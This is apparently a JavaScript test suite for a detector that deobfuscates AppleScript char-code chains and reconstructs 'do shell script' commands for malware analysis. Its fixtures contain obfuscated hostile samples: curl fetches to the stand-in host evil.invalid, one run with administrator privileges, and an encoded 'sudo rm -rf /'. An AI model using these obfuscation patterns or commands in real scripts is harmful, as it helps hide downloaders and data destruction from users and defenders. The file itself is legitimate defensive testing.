'use strict';
// applescript-obfuscation.test.js — AppleScript / JXA char-code
// reassembly decoder with cross-reference resolution.
//
// Two-pass decoder:
//   Pass 1 — Collect `property _X : <rhs>` / `set _X to <rhs>` /
//            `global _X : <rhs>` / `local _X : <rhs>` bindings.
//   Pass 2 — Fixed-point resolve cross-references (max 8 rounds).
//   Pass 3 — Walk `do shell script <expr>` sinks, substitute resolved
//            bindings, emit reassembled cleartext command.
//   Pass 4 — Legacy AS1/AS2 anonymous chain finder for `&`-chains NOT
//            captured by any binding or sink.
//
// Techniques emitted (all flow through _processCommandObfuscation):
//   - AppleScript Binding Reassembly
//   - AppleScript Partial Binding Reassembly
//   - AppleScript Reassembled Shell Command
//   - AppleScript Reassembled Admin Shell Command
//   - AppleScript Partially-Reassembled Shell Command
//   - AppleScript Char-Code Reassembly (anonymous AS1)
//   - AppleScript Codepoint Array (anonymous AS2)
//
// File-level plausibility gate: no candidates emit unless the file has
// `do shell script`, ≥ 2 randomised `property _X :` bindings, ≥ 3
// char-code primitives, or classic AppleScript surface.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/applescript-obfuscation.js',
]);
const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

function pick(cands, pred) {
  return host(cands.filter(pred));
}

// ── Anonymous AS1 chain ────────────────────────────────────────────────────

test('applescript-obfuscation: AS1 anonymous chain resolves to `curl`', () => {
  // File needs `do shell script` to pass file-level plausibility gate,
  // but the chain is inside `display dialog` so it isn't a sink.
  const text =
    `do shell script "echo hi"\n` +
    `display dialog ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'AppleScript Char-Code Reassembly');
  assert.ok(hits.length >= 1,
    `expected anon AS1 hit; got: ${JSON.stringify(host(cands))}`);
  assert.ok(hits[0].deobfuscated.includes('curl'),
    `expected reassembled 'curl'; got: ${hits[0].deobfuscated}`);
});

test('applescript-obfuscation: AS1 anon chain mixes character id / ASCII / literal', () => {
  const text =
    `do shell script "echo hi"\n` +
    `display dialog ((character id 104) & (character id 116) & (character id 116) & (character id 112) & (character id 115) & ":" & (ASCII character 47) & (ASCII character 47))`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'AppleScript Char-Code Reassembly');
  assert.ok(hits.length >= 1, `expected anon hit; got: ${JSON.stringify(host(cands))}`);
  assert.ok(/https:\/\//.test(hits[0].deobfuscated),
    `expected 'https://' in reassembly; got: ${hits[0].deobfuscated}`);
});

test('applescript-obfuscation: AS2 anonymous string id {…} literal', () => {
  const text =
    `do shell script "echo hi"\n` +
    `display dialog (string id {115, 117, 100, 111, 32, 114, 109, 32, 45, 114, 102, 32, 47})`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'AppleScript Codepoint Array');
  assert.ok(hits.length >= 1, `expected AS2 hit; got: ${JSON.stringify(host(cands))}`);
  // Pass 4 AS1/AS2 emitters now AS-quote their output so splicing at
  // the chain offset produces a valid AppleScript sub-expression
  // (`("sudo rm -rf /")`) instead of a bare unquoted string that
  // would wedge the surrounding expression. Bare resolved bytes
  // remain available via `_resolvedValue`.
  assert.equal(hits[0].deobfuscated, '"sudo rm -rf /"');
  assert.equal(hits[0]._resolvedValue, 'sudo rm -rf /');
});

// ── Binding collection + resolution ────────────────────────────────────────

test('applescript-obfuscation: property binding with literal RHS is NOT emitted', () => {
  // Pure string-literal bindings aren't obfuscation — skip.
  const text =
    `property _X : "abc"\n` +
    `property _Y : "def"\n` +
    `do shell script "echo hi"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Binding Reassembly/.test(c.technique));
  assert.equal(hits.length, 0,
    `pure-literal bindings should not emit; got: ${JSON.stringify(host(cands))}`);
});

test('applescript-obfuscation: property binding with char-code chain emits Binding Reassembly', () => {
  const text =
    `property _A : ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))\n` +
    `property _B : "https://"\n` +
    `do shell script "echo hi"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const aHits = pick(cands, c => c._assignedTo === '_A');
  assert.ok(aHits.length >= 1,
    `expected _A binding hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(aHits[0].technique, 'AppleScript Binding Reassembly');
  // Deobfuscated output is a full valid AppleScript binding statement
  // (label + requoted resolved value) so splicing back into source
  // produces copy-paste-runnable AppleScript instead of a bare fragment.
  assert.equal(aHits[0].deobfuscated, 'property _A : "curl"');
  assert.equal(aHits[0]._resolvedValue, 'curl');
  assert.equal(aHits[0]._bindingKind, 'property');
});

test('applescript-obfuscation: cross-reference resolution — _B : _A & "xyz"', () => {
  const text =
    `property _A : ((ASCII character 97) & (ASCII character 98) & (ASCII character 99))\n` +
    `property _B : _A & "def"\n` +
    `do shell script "echo hi"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const bHit = pick(cands, c => c._assignedTo === '_B');
  assert.ok(bHit.length >= 1, `expected _B binding; got: ${JSON.stringify(host(cands))}`);
  assert.equal(bHit[0]._resolvedValue, 'abcdef');
  assert.equal(bHit[0].deobfuscated, 'property _B : "abcdef"');
  assert.equal(bHit[0].technique, 'AppleScript Binding Reassembly');
});

test('applescript-obfuscation: three-level cross-reference chain resolves', () => {
  const text =
    `property _A : ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & ":")\n` +
    `property _B : _A & "/" & "/"\n` +
    `property _C : _B & "evil.invalid"\n` +
    `do shell script "echo hi"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const cHit = pick(cands, c => c._assignedTo === '_C');
  assert.ok(cHit.length >= 1, `expected _C binding; got: ${JSON.stringify(host(cands))}`);
  assert.equal(cHit[0]._resolvedValue, 'https://evil.invalid');
  assert.equal(cHit[0].deobfuscated, 'property _C : "https://evil.invalid"');
});

test('applescript-obfuscation: circular reference does not loop — both marked partial', () => {
  const text =
    `property _A : _B & "a"\n` +
    `property _B : _A & "b"\n` +
    `do shell script "echo hi"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hits = pick(cands, c => c._assignedTo === '_A' || c._assignedTo === '_B');
  assert.ok(hits.length >= 1, 'expected at least one partial binding');
  for (const h of hits) {
    assert.equal(h.technique, 'AppleScript Partial Binding Reassembly',
      `expected partial technique; got ${h.technique}`);
    assert.ok(h._resolvedValue.includes('\u27E8'),
      `expected circular placeholder ⟨…⟩ in resolved value; got: ${h._resolvedValue}`);
  }
});

test('applescript-obfuscation: partial resolution shows ⟨unresolved:_NAME⟩ placeholder', () => {
  const text =
    `property _X : "abc" & _UNKNOWN & "def"\n` +
    `do shell script "echo hi"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '_X');
  assert.ok(hit.length >= 1, `expected _X partial; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hit[0].technique, 'AppleScript Partial Binding Reassembly');
  assert.ok(hit[0]._resolvedValue.includes('\u27E8unresolved:_UNKNOWN\u27E9'),
    `expected ⟨unresolved:_UNKNOWN⟩ placeholder; got: ${hit[0]._resolvedValue}`);
});

// ── Do shell script reassembly ─────────────────────────────────────────────

test('applescript-obfuscation: do shell script reassembles from bindings', () => {
  const text =
    `property _A : ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))\n` +
    `property _B : " https://evil.invalid/x"\n` +
    `do shell script (_A & _B)`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = pick(cands, c => c.technique === 'AppleScript Reassembled Shell Command');
  assert.ok(sink.length >= 1,
    `expected shell-sink reassembly; got: ${JSON.stringify(host(cands))}`);
  assert.ok(/curl https:\/\/evil\.invalid\/x/.test(sink[0].deobfuscated),
    `expected curl+URL cleartext; got: ${sink[0].deobfuscated}`);
});

test('applescript-obfuscation: do shell script with admin privileges escalates severity', () => {
  const text =
    `property _A : ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))\n` +
    `do shell script _A with administrator privileges`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = pick(cands, c => c.technique === 'AppleScript Reassembled Admin Shell Command');
  assert.ok(sink.length >= 1,
    `expected admin-shell reassembly; got: ${JSON.stringify(host(cands))}`);
  assert.ok(sink[0].deobfuscated.includes('curl'));
  assert.ok(sink[0].deobfuscated.includes('administrator privileges'),
    `expected admin marker in deobfuscated; got: ${sink[0].deobfuscated}`);
});

test('applescript-obfuscation: do shell script inline char-code chain reassembles', () => {
  const text =
    `do shell script ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108) & " -H 'User-Agent: Mozilla' https://evil.invalid/x")`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = pick(cands, c => /Reassembled/.test(c.technique));
  assert.ok(sink.length >= 1,
    `expected inline sink reassembly; got: ${JSON.stringify(host(cands))}`);
  assert.ok(/curl\s+-H.+https:\/\/evil\.invalid/.test(sink[0].deobfuscated),
    `expected full command in deobfuscated; got: ${sink[0].deobfuscated}`);
});

// ── User's sample shape: hex-fragment property ─────────────────────────────

test('applescript-obfuscation: hex-fragment property binding resolves correctly', () => {
  // Reassembles to `55fc29d3e58cef031ff67dcc6c3e401a` — the 32-char
  // hex sample from the bug report. Previously dropped because the
  // sensitive-keyword gate didn't match pure hex. With that gate
  // removed plus the file-level plausibility gate, the binding
  // surfaces when the file has enough context (≥ 2 randomised
  // property bindings here).
  const text =
    `property _WCXGBZ49Xh : ((character id 53) & (character id 53) & (character id 102) & (character id 99) & "2" & (ASCII character 57) & (character id 100) & "3e5" & (character id 56) & "c" & (ASCII character 101) & (character id 102) & (character id 48) & (ASCII character 51) & (ASCII character 49) & (ASCII character 102) & "f6" & (character id 55) & (ASCII character 100) & (ASCII character 99) & (ASCII character 99) & "6c" & (character id 51) & (ASCII character 101) & (ASCII character 52) & (ASCII character 48) & (character id 49) & "a")\n` +
    `property _Another123ABC : "https://evil.invalid/"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '_WCXGBZ49Xh');
  assert.ok(hit.length >= 1, `expected _WCXGBZ49Xh binding; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hit[0]._resolvedValue, '55fc29d3e58cef031ff67dcc6c3e401a',
    `expected hex reassembly; got: ${hit[0]._resolvedValue}`);
  // And the full binding statement is preserved in `deobfuscated`
  // so the stitched output keeps the `property _WCXGBZ49Xh :` label.
  assert.equal(hit[0].deobfuscated,
    'property _WCXGBZ49Xh : "55fc29d3e58cef031ff67dcc6c3e401a"');
});

// ── File-level plausibility gate ───────────────────────────────────────────

test('applescript-obfuscation: benign file with single (character id 233) is gated out', () => {
  // Simulates benign internationalised AppleScript with a single
  // locale-diacritic codepoint and nothing else that looks like
  // AppleScript. The plausibility gate should skip this entirely.
  const text = `display "Caf" & (character id 233)`; // "Café"
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  assert.equal(cands.length, 0,
    `benign file should be gated out; got: ${JSON.stringify(host(cands))}`);
});

test('applescript-obfuscation: file with 2 randomised property bindings admits', () => {
  // Two randomised `property _XXXXXX :` bindings alone pass the gate
  // even without `do shell script` — this is the stager-fragment
  // shape where the actual exec is in a sibling file.
  const text =
    `property _WCXGBZ49Xh : ((ASCII character 104) & (ASCII character 105) & (ASCII character 33))\n` +
    `property _Another123ABC : ((ASCII character 98) & (ASCII character 121) & (ASCII character 101))`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Binding Reassembly/.test(c.technique));
  assert.ok(hits.length >= 2,
    `two randomised bindings should admit; got: ${JSON.stringify(host(cands))}`);
});

// ── Short / degenerate input ───────────────────────────────────────────────

test('applescript-obfuscation: short input returns empty', () => {
  const out = d._findAppleScriptObfuscationCandidates('short', {});
  assert.equal(out.length, 0);
});

test('applescript-obfuscation: text with no AppleScript primitives returns empty', () => {
  const text = 'plain text with no applescript primitives, just english words and curl';
  const out = d._findAppleScriptObfuscationCandidates(text, {});
  assert.equal(out.length, 0);
});

// ── Codepoint bounds ───────────────────────────────────────────────────────

test('applescript-obfuscation: string id {…} rejects out-of-range codepoints', () => {
  // Out-of-range codepoint should kill the AS2 literal AND the binding.
  const text =
    `do shell script "echo hi"\n` +
    `display dialog (string id {1114113, 99, 117, 114, 108})`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const stridHits = pick(cands, c => c.technique === 'AppleScript Codepoint Array');
  assert.equal(stridHits.length, 0,
    `out-of-range should reject AS2 literal; got: ${JSON.stringify(host(cands))}`);
});

// ── End-to-end via _processCommandObfuscation ──────────────────────────────

test('applescript-obfuscation: quoted form of <literal> POSIX-quotes into shell command', () => {
  // `quoted form of "arg with spaces"` must become POSIX 'arg with spaces'
  // in the reassembled command, not three ⟨unresolved⟩ placeholders.
  const text =
    `do shell script ("/bin/echo " & quoted form of "hello world")`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = pick(cands, c => /Reassembled/.test(c.technique));
  assert.ok(sink.length >= 1,
    `expected sink; got: ${JSON.stringify(host(cands))}`);
  assert.equal(sink[0]._resolvedValue, "/bin/echo 'hello world'",
    `expected POSIX-quoted arg; got: ${sink[0]._resolvedValue}`);
  assert.ok(!/⟨.*quoted.*⟩/.test(sink[0].deobfuscated),
    `must not emit ⟨quoted⟩ placeholder; got: ${sink[0].deobfuscated}`);
});

test('applescript-obfuscation: quoted form of <binding-ref> resolves via binding map', () => {
  // `quoted form of _URL` where _URL is a resolvable binding must
  // POSIX-quote the RESOLVED URL, not leave the name as ⟨unresolved⟩.
  const text =
    `property _URL : ((ASCII character 104) & (ASCII character 116) & (ASCII character 116) & (ASCII character 112) & "://evil.invalid/x")\n` +
    `do shell script ("curl " & quoted form of _URL)`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = pick(cands, c => /Reassembled/.test(c.technique));
  assert.ok(sink.length >= 1, `expected sink; got: ${JSON.stringify(host(cands))}`);
  assert.equal(sink[0]._resolvedValue, "curl 'http://evil.invalid/x'",
    `expected resolved+quoted URL; got: ${sink[0]._resolvedValue}`);
});

test('applescript-obfuscation: quoted form of embeds single quotes safely (POSIX backslash-single-quote)', () => {
  // `quoted form of "it's"` → POSIX `'it'\''s'`. Ensures our quoter
  // handles embedded single-quotes correctly.
  const text =
    `do shell script ("echo " & quoted form of "it's on")`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = pick(cands, c => /Reassembled/.test(c.technique));
  assert.ok(sink.length >= 1, `expected sink; got: ${JSON.stringify(host(cands))}`);
  assert.equal(sink[0]._resolvedValue, "echo 'it'\\''s on'",
    `expected POSIX-escaped single quote; got: ${sink[0]._resolvedValue}`);
});

test('applescript-obfuscation: binding-reassembly output is VALID AppleScript syntax', () => {
  // F4 — the deobfuscated output must be spliceable back into source
  // as valid AppleScript. Two-level cross-ref with quote-requoting.
  const text =
    `property _A : ((ASCII character 104) & (ASCII character 101) & (ASCII character 121))\n` +
    `property _B : _A & " there"\n` +
    `do shell script "echo " & _B`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const a = pick(cands, c => c._assignedTo === '_A');
  const b = pick(cands, c => c._assignedTo === '_B');
  assert.ok(a.length >= 1, `expected _A; got: ${JSON.stringify(host(cands))}`);
  assert.ok(b.length >= 1, `expected _B; got: ${JSON.stringify(host(cands))}`);
  assert.equal(a[0].deobfuscated, 'property _A : "hey"');
  assert.equal(b[0].deobfuscated, 'property _B : "hey there"');
});

test('applescript-obfuscation: embedded double-quote in resolved value is AS-escaped', () => {
  // Resolved value contains a `"` — must be backslash-escaped when
  // AppleScript-quoted for splicing. Source: `(ASCII character 34)` = `"`.
  const text =
    `property _A : ((ASCII character 97) & (ASCII character 34) & (ASCII character 98))\n` +
    `property _Other : "extra"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '_A');
  assert.ok(hit.length >= 1, `expected _A; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hit[0]._resolvedValue, 'a"b');
  assert.equal(hit[0].deobfuscated, 'property _A : "a\\"b"');
});

test('applescript-obfuscation: embedded backslash in resolved value is AS-escaped', () => {
  // Source: `(ASCII character 92)` = `\`. Must become `\\` in output.
  const text =
    `property _A : ((ASCII character 97) & (ASCII character 92) & (ASCII character 98))\n` +
    `property _Other : "extra"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '_A');
  assert.equal(hit[0]._resolvedValue, 'a\\b');
  assert.equal(hit[0].deobfuscated, 'property _A : "a\\\\b"');
});

test('applescript-obfuscation: set binding uses `to` separator in reconstructed output', () => {
  // `set X to …` must reconstruct as `set X to "…"`, not `set X : "…"`.
  const text =
    `set _X to ((ASCII character 97) & (ASCII character 98) & (ASCII character 99))\n` +
    `property _Y : "x"`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '_X');
  assert.equal(hit[0].deobfuscated, 'set _X to "abc"');
  assert.equal(hit[0]._bindingKind, 'set');
});

test('applescript-obfuscation: shell-sink output preserves `do shell script` wrapper', () => {
  // F3 — the deobfuscated sink must include the `do shell script "…"`
  // envelope so splicing back produces valid AppleScript.
  const text =
    `property _A : ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))\n` +
    `do shell script (_A & " https://evil.invalid/x")`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = pick(cands, c => c.technique === 'AppleScript Reassembled Shell Command');
  assert.ok(sink.length >= 1, `expected sink; got: ${JSON.stringify(host(cands))}`);
  assert.equal(sink[0].deobfuscated,
    'do shell script "curl https://evil.invalid/x"');
  assert.equal(sink[0]._resolvedValue, 'curl https://evil.invalid/x');
});

test('applescript-obfuscation: admin-shell sink output preserves wrapper + modifier', () => {
  const text =
    `property _A : ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))\n` +
    `do shell script _A with administrator privileges`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = pick(cands, c => c.technique === 'AppleScript Reassembled Admin Shell Command');
  assert.ok(sink.length >= 1, `expected admin sink; got: ${JSON.stringify(host(cands))}`);
  assert.equal(sink[0].deobfuscated,
    'do shell script "curl" with administrator privileges');
});

// ── F6 / F10 — scope-aware binding collection ─────────────────────────────

test('applescript-obfuscation: set binding inside top-level if-then IS collected', () => {
  // F6 — user-report case: `set _X to …` inside a top-level `if …
  // then … end if` block. The binding must resolve so the downstream
  // sink referencing _X produces cleartext.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `if (1 = 1) then\n` +
    `    set _UCg1iH9a to ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108) & " https://evil.invalid/x")\n` +
    `end if\n` +
    `do shell script _UCg1iH9a`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '_UCg1iH9a');
  assert.ok(hit.length >= 1,
    `expected _UCg1iH9a collected from top-level if block; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hit[0]._resolvedValue, 'curl https://evil.invalid/x');
  // Sink should resolve fully.
  const sink = pick(cands, c => c.technique === 'AppleScript Reassembled Shell Command');
  assert.ok(sink.length >= 1, 'expected resolved sink');
  assert.equal(sink[0]._resolvedValue, 'curl https://evil.invalid/x');
});

test('applescript-obfuscation: handler-local self-contained set IS collected with _handlerScoped', () => {
  // F10 (revised): self-contained char-code chains inside a handler
  // ARE collected so Pass 3 sinks inside the same handler can resolve
  // their refs. Tagged `_handlerScoped: true` so downstream consumers
  // can discriminate handler-scope bindings from file-scope ones.
  // Genuine runtime-accessor sets (`set X to (contents of y)` etc.)
  // remain uncollected — that's covered in a separate test below.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `on __myHandler()\n` +
    `    set _RuntimeLocal to ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))\n` +
    `    return _RuntimeLocal\n` +
    `end __myHandler\n` +
    `do shell script __myHandler() with administrator privileges`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '_RuntimeLocal');
  assert.equal(hit.length, 1,
    `handler-local self-contained set must be collected; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hit[0]._resolvedValue, 'curl');
  assert.equal(hit[0]._bindingKind, 'set');
});

test('applescript-obfuscation: handler-local set with runtime accessor is NOT collected', () => {
  // Runtime-accessor keywords (`contents of`, `result`, `do shell
  // script` on RHS, etc.) mean the binding's value depends on
  // handler-argument or loop-iterator state the decoder can't know
  // statically. Refuse to collect so Pass 3 doesn't emit
  // `⟨unresolved⟩`-riddled partial reassemblies that mislead the
  // analyst about completeness.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `on __myHandler()\n` +
    `    repeat with _iter in {"a", "b", "c"}\n` +
    `        set _FromLoop to (contents of _iter)\n` +
    `        set _FromResult to result\n` +
    `    end repeat\n` +
    `end __myHandler\n` +
    `do shell script __myHandler() with administrator privileges`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const fromLoop = pick(cands, c => c._assignedTo === '_FromLoop');
  const fromResult = pick(cands, c => c._assignedTo === '_FromResult');
  assert.equal(fromLoop.length, 0,
    `runtime-accessor set must not be collected; got: ${JSON.stringify(host(cands))}`);
  assert.equal(fromResult.length, 0,
    `runtime-result set must not be collected; got: ${JSON.stringify(host(cands))}`);
});

test('applescript-obfuscation: top-level set inside try block IS collected', () => {
  // F6 — `try … end try` is a top-level control-flow block, not a
  // handler. Bindings inside ARE collected.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `try\n` +
    `    set _TryScope to ((ASCII character 112) & (ASCII character 105) & (ASCII character 110) & (ASCII character 103))\n` +
    `end try\n` +
    `do shell script _TryScope`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '_TryScope');
  assert.ok(hit.length >= 1,
    `try-block set must be collected; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hit[0]._resolvedValue, 'ping');
});

test('applescript-obfuscation: empty property is overridden by later top-level set', () => {
  // User-fixture pattern: `property X : ""` at file top acts as a
  // forward-declaration that a later `set X to ((char chain))` at
  // top-level populates. First-seen-wins would lock in the empty
  // value; we special-case pure-empty literal properties to let the
  // richer `set` override.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `property __UA : ""\n` +
    `set __UA to ((ASCII character 104) & (ASCII character 101) & (ASCII character 108) & (ASCII character 108) & (ASCII character 111))\n` +
    `do shell script __UA`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '__UA');
  assert.ok(hit.length >= 1, `expected __UA; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hit[0]._resolvedValue, 'hello');
  assert.equal(hit[0]._bindingKind, 'set');
});

test('applescript-obfuscation: string-aware paren tracking handles `"(M"` inside chain', () => {
  // Source with `"("` literal inside a char-code chain — naive
  // paren-depth counting would mis-balance the stack. The tokeniser
  // must treat quote-delimited strings as opaque.
  const text =
    `property _Other1 : "x"\n` +
    `property _Other2 : "y"\n` +
    `set __UA to ("(M" & (character id 97) & (character id 99) & ")" & "intosh" & " (" & (ASCII character 88) & ")")\n` +
    `do shell script __UA`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const hit = pick(cands, c => c._assignedTo === '__UA');
  assert.ok(hit.length >= 1,
    `string-aware paren tracking regression; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hit[0]._resolvedValue, '(Mac)intosh (X)');
});

test('applescript-obfuscation: sink candidate promotes to high+ severity with URL IOC', async () => {
  const text =
    `do shell script ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108) & " -H 'User-Agent: Mozilla' https://evil.invalid/x")`;
  const cands = d._findAppleScriptObfuscationCandidates(text, {});
  const sink = cands.filter(c => /Reassembled/.test(c.technique));
  assert.ok(sink.length >= 1,
    `expected sink reassembly; got: ${JSON.stringify(host(cands))}`);
  const finding = await d._processCommandObfuscation(sink[0]);
  assert.ok(finding, 'expected promoted finding');
  assert.equal(finding.type, 'encoded-content');
  assert.ok(['high', 'critical'].includes(finding.severity),
    `expected high+ severity; got: ${finding.severity}`);
  const urls = host(finding.iocs.filter(i => /url/i.test(String(i.type || ''))));
  assert.ok(urls.length >= 1,
    `expected URL IOC; got: ${JSON.stringify(host(finding.iocs))}`);
});

// ── Binding-table static helper on the renderer ────────────────────────────

const osCtx = loadModules([
  'vendor/tldts.min.js',
  'src/constants.js',
  'src/renderers/osascript-renderer.js',
], { expose: ['OsascriptRenderer', 'pushIOC', 'pushBareDomain', 'IOC'] });
const { OsascriptRenderer } = osCtx;

test('OsascriptRenderer._reassembleCharCodeChains: resolves AS1 anon chain', () => {
  const text =
    `do shell script "echo hi"\n` +
    `display dialog ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))`;
  const out = OsascriptRenderer._reassembleCharCodeChains(text);
  assert.ok(out.some(s => s.includes('curl')),
    `expected 'curl'; got: ${JSON.stringify(out)}`);
});

test('OsascriptRenderer._reassembleCharCodeChains: resolves AS2 string id literal', () => {
  const text =
    `property _P : (string id {72, 101, 108, 108, 111})`;
  const out = OsascriptRenderer._reassembleCharCodeChains(text);
  assert.ok(out.includes('Hello'),
    `expected 'Hello'; got: ${JSON.stringify(out)}`);
});

test('OsascriptRenderer._reassembleCharCodeChains: empty on non-applescript', () => {
  const out = OsascriptRenderer._reassembleCharCodeChains('plain log file');
  assert.equal(out.length, 0);
});

test('OsascriptRenderer._reassembleBindingTable: surfaces bindings with source offsets', () => {
  // Two property bindings + a sink — the structured `bindings` /
  // `sinks` arrays are what the renderer consumes to emit
  // signatureMatches with click-to-scroll anchors.
  const text =
    `property _A : ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))\n` +
    `property _B : _A & " https://evil.invalid/"\n` +
    `do shell script _B`;
  const out = OsascriptRenderer._reassembleBindingTable(text);
  assert.ok(Array.isArray(out.bindings), 'expected bindings array');
  const a = out.bindings.find(b => b.name === '_A');
  const b = out.bindings.find(b => b.name === '_B');
  assert.ok(a, `expected _A binding; got: ${JSON.stringify(out.bindings)}`);
  assert.ok(b, `expected _B binding; got: ${JSON.stringify(out.bindings)}`);
  assert.equal(a.resolved, 'curl');
  assert.equal(b.resolved, 'curl https://evil.invalid/');
  assert.equal(a.kind, 'property');
  // Source offset must land on the `property _A :` declaration in raw
  // source so click-to-scroll in the sidebar navigates correctly.
  const aSlice = text.substring(a.sourceOffset, a.sourceOffset + a.sourceLength);
  assert.ok(/^\s*property\s+_A\s*:/.test(aSlice),
    `sourceOffset must point at 'property _A :' declaration; got: "${aSlice}"`);
  // Legacy `lines` array kept for format-shape coverage.
  assert.ok(out.lines.some(l => /^-- Binding: _A \(property\)/.test(l)));
});

test('OsascriptRenderer._reassembleBindingTable: surfaces sinks with source offsets anchored at `do shell script`', () => {
  const text =
    `property _A : ((ASCII character 99) & (ASCII character 117) & (ASCII character 114) & (ASCII character 108))\n` +
    `do shell script (_A & " https://evil.invalid/x") with administrator privileges`;
  const out = OsascriptRenderer._reassembleBindingTable(text);
  assert.ok(Array.isArray(out.sinks) && out.sinks.length === 1,
    `expected 1 sink; got: ${JSON.stringify(out.sinks)}`);
  const sink = out.sinks[0];
  assert.equal(sink.resolved, 'curl https://evil.invalid/x');
  assert.equal(sink.isAdmin, true);
  // Source offset must anchor at the `do shell script` keyword so
  // click-to-scroll lands on the real sink, not the synthetic
  // reassembled output.
  const slice = text.substring(sink.sourceOffset, sink.sourceOffset + sink.sourceLength);
  assert.ok(/^do\s+shell\s+script\b/i.test(slice),
    `sourceOffset must anchor at 'do shell script'; got: "${slice.slice(0, 50)}"`);
  // Legacy `lines` array kept for format-shape coverage.
  assert.ok(out.lines.some(l => /^-- Reassembled: do shell script "curl https:\/\/evil\.invalid\/x" with administrator privileges$/.test(l)));
});

test('OsascriptRenderer._reassembleBindingTable: empty on plain text', () => {
  const out = OsascriptRenderer._reassembleBindingTable('plain log file');
  assert.equal(out.lines.length, 0);
  assert.equal(out.bindings.length, 0);
  assert.equal(out.sinks.length, 0);
});

// ── Tier A: Loop-iterator expansion ───────────────────────────────────────

test('applescript-obfuscation: Tier A — property with list literal collects listValues', () => {
  // `property _L : {e1, e2, e3}` resolves to a list-typed binding
  // whose `listValues` array carries the resolved element strings.
  const text =
    `do shell script "echo hi"\n` +
    `property _L : {"9sxgrev.pro", "axj0tw9.lol", "jnoaxfwe.info"}\n` +
    `property _Other : "x"\n`;
  const bindings = d._collectAppleScriptBindings(text);
  d._resolveAppleScriptBindings(bindings);
  const rec = bindings.get('_L');
  assert.ok(rec, 'expected _L binding');
  assert.ok(Array.isArray(rec.listValues), 'expected listValues array');
  assert.equal(rec.listValues.length, 3);
  assert.equal(rec.listValues[0], '9sxgrev.pro');
  assert.equal(rec.listValues[1], 'axj0tw9.lol');
  assert.equal(rec.listValues[2], 'jnoaxfwe.info');
});

